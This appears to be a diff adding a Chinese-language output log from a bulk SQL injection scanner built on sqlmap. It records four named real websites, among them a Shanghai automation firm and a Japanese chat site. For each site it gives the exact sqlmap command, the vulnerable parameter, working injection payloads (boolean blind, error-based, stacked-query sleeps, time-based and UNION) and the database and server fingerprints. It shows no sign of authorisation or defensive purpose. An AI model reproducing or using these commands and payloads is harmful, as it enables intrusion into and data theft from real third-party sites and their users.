@@ -1,0 +1,74 @@
+发现时间 : 2019-03-01:21:16:27
+网站标题 : 项目计划书模板
+注入网址 : http://www.myjoyi.com/20190301/9*.shtml
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\sqlmap\sqlmap.py -u http://www.myjoyi.com/20190301/9*.shtml --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://www.myjoyi.com:80/20190301/9' AND 5872=5872 AND 'ogZN'='ogZN.shtml
+
+
+存在注入但无法识别数据库版本
+---------------------------
+发现时间 : 2019-03-01:21:27:30
+网站标题 : 上海驼峰自动化技术有限公司
+注入网址 : http://www.humptech.com/product.asp?root_id=70&child_id=77&id=9
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\sqlmap\sqlmap.py -u http://www.humptech.com/product.asp?root_id=70^&child_id=77^&id=9 --batch --thread=10 --random-agent
+
+注入参数(方式) : child_id (GET)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : root_id=70&child_id=77 AND 2066=2066&id=9
+
+数据库类型 : Microsoft Access
+服务器版本 : Windows 2003 or XP
+服务器语言 : ASP.NET, Microsoft IIS 6.0, ASP
+数据库版本 : Microsoft Access
+
+发现时间 : 2019-03-01:21:32:53
+网站标题 : 【听和国际】美国公司注册|注册美国公司|注册美国商标|美国L1签证|注册英国公司|注册澳洲公司 - 听和国际
+注入网址 : http://www.uspoagent.com//news/detail/3013*.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\sqlmap\sqlmap.py -u http://www.uspoagent.com//news/detail/3013*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    注入攻击 : http://www.uspoagent.com:80//news/detail/-9928' OR 9748=9748#.html
+
+    注入方式 : error-based
+    注入标题 : MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    注入攻击 : http://www.uspoagent.com:80//news/detail/3013' AND EXTRACTVALUE(9440,CONCAT(0x5c,0x7170717671,(SELECT (ELT(9440=9440,1))),0x71766b7671))-- nddh.html
+
+    注入方式 : stacked queries
+    注入标题 : MySQL > 5.0.11 stacked queries (comment)
+    注入攻击 : http://www.uspoagent.com:80//news/detail/3013';SELECT SLEEP(5)#.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL <= 5.0.11 AND time-based blind (heavy query)
+    注入攻击 : http://www.uspoagent.com:80//news/detail/3013' AND 5979=BENCHMARK(5000000,MD5(0x44505277))-- IILI.html
+
+数据库类型 : MySQL
+服务器版本 : Windows 2008 R2 or 7
+服务器语言 : ASP.NET, Microsoft IIS 7.5
+数据库版本 : MySQL >= 5.1
+
+发现时间 : 2019-03-01:21:33:39
+网站标题 : チャットしてらっしゃい
+注入网址 : http://chattera.net/room.php?room=1.1.62
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.3\lib\sqlmap\sqlmap.py -u http://chattera.net/room.php?room=1.1.62 --batch --thread=10 --random-agent
+
+注入参数(方式) : room (GET)
+    注入方式 : stacked queries
+    注入标题 : PostgreSQL > 8.1 stacked queries (comment)
+    注入攻击 : room=1.1.62');SELECT PG_SLEEP(5)--
+
+    注入方式 : UNION query
+    注入标题 : Generic UNION query (NULL) - 2 columns
+    注入攻击 : room=-2164') UNION ALL SELECT (CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113))||(CHR(77)||CHR(103)||CHR(67)||CHR(118)||CHR(120)||CHR(73)||CHR(116)||CHR(69)||CHR(106)||CHR(88)||CHR(86)||CHR(89)||CHR(88)||CHR(81)||CHR(122)||CHR(107)||CHR(113)||CHR(75)||CHR(117)||CHR(99)||CHR(112)||CHR(106)||CHR(111)||CHR(87)||CHR(72)||CHR(120)||CHR(89)||CHR(119)||CHR(121)||CHR(69)||CHR(108)||CHR(83)||CHR(117)||CHR(106)||CHR(107)||CHR(76)||CHR(99)||CHR(114)||CHR(107)||CHR(117))||(CHR(113)||CHR(118)||CHR(118)||CHR(113)||CHR(113)),NULL-- yski
+
+数据库类型 : PostgreSQL
+服务器版本 : Linux CentOS 5.10
+服务器语言 : PHP 5.3.3, Apache 2.2.3
+数据库版本 : PostgreSQL
+
